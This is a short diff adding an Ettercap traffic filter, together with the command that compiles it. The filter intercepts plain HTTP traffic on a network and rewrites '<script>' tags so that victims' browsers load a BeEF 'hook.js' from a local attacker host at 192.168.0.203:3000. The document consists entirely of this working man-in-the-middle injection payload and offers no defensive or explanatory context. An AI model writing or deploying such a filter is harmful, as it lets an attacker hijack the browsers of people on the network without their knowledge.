@@ -1,0 +1,5 @@
+if(ip.proto==TCP&&tcp.dst==80){if (search(DATA.data, "Accept-Encoding")){replace("<script>", "<script src=http://192.168.0.203:3000/hook.js>");msg("beef\n");}}
+
+#etterfilter beef.txt -o beef.ef
+
+
